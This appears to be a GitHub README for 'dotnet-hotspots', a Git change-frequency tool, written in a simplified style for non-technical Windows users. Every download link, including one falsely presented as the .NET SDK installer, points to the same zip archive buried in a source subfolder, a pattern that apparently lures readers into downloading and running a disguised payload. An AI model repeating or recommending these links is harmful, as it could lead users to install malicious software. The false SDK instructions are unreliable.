# 🕵️ dotnet-hotspots - Find Frequent File Changes Fast

[![Download dotnet-hotspots](https://img.shields.io/badge/Download-dotnet--hotspots-brightgreen)](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)

## 🔍 What is dotnet-hotspots?

dotnet-hotspots is a tool that looks at your Git project and finds files that change a lot. It helps you see which parts of your project get updated often. This can be useful for understanding your project better or spotting areas that may need extra attention.

You do not need to know how to code to use this tool. It works on Windows and runs with simple commands in the Command Prompt.

---

## 📋 What You Will Need

- A Windows computer with version 10 or newer.
- Internet connection to download the tool.
- A Git repository folder on your PC. This means you must have a project under Git version control.
- Basic use of the Command Prompt (instructions included).

---

## 🌐 Download dotnet-hotspots

[![Download dotnet-hotspots](https://img.shields.io/badge/Download-dotnet--hotspots-orange?style=for-the-badge)](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)

To get started, visit this page to download the tool and follow the instructions below.

Link: [https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)

---

## 🚀 Installing and Running dotnet-hotspots on Windows

Follow these steps carefully to run the tool on your system.

### 1. Install .NET SDK (if not installed)

dotnet-hotspots runs on the .NET platform. You need the .NET SDK installed on your computer first.

- Go to https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip to get the latest SDK for Windows.
- Download the installer and run it.
- Follow the on-screen instructions until the installation finishes.
- To check if .NET is installed, open Command Prompt and type:

  ```
  dotnet --version
  ```

  If you see a version number, you are ready to go.

### 2. Open Command Prompt

- Press the Windows key.
- Type `cmd`.
- Press Enter.
- The Command Prompt window will open.

### 3. Install dotnet-hotspots as a global tool

In the Command Prompt, type the following command to install dotnet-hotspots:

```
dotnet tool install --global dotnet-hotspots
```

This downloads and installs the tool so you can run it from any folder.

### 4. Confirm Installation

To check installed tools, run:

```
dotnet tool list --global
```

You should see `dotnet-hotspots` listed.

### 5. Navigate to Your Git Repository Folder

Use the `cd` command to change to the folder where your Git project lives.

For example:

```
cd C:\Users\YourName\Documents\MyGitProject
```

Make sure there is a `.git` folder inside your project folder (this means it is a Git repository).

### 6. Run dotnet-hotspots

Type the following command to start analyzing your repository:

```
dotnet-hotspots
```

The tool will examine your commit history and show a list of files that change the most.

---

## 🛠 Understanding the Results

dotnet-hotspots shows files ordered by how often they are changed in past commits. This helps you see which parts of your code are active. 

- Files near the top have frequent changes.
- Files at the bottom change less often.
  
This allows you to find code that might need more testing or code review.

---

## 💡 Tips for Using dotnet-hotspots

- Run the tool regularly to track changes over time.
- Use it to spot files with unexpected activity.
- Combine results with other project metrics to improve quality.
- Share reports with your team for better collaboration.

---

## ⚙️ Configuration Options (Optional)

dotnet-hotspots supports some settings you can change by running commands with extra options.

- To view help, run:

  ```
  dotnet-hotspots --help
  ```

- Change how many commits the tool analyzes.
- Filter by file types or folders.
  
Check the help command for all available options.

---

## 🖥 System Requirements

- Windows 10 or higher.
- .NET SDK 6.0 or newer.
- Minimum 1 GB free disk space.
- Internet connection for installation only.
- Git repository folder on your local drive.

---

## ❓ Troubleshooting

- If `dotnet` command is not recognized, make sure the .NET SDK installed correctly.
- If you are not inside a Git repository folder, dotnet-hotspots will not work.
- Check your internet connection during installation steps.
- Run Command Prompt as administrator if you face permission errors.

---

## 📥 Ready to start?

Visit this page to download and access further details:

[https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)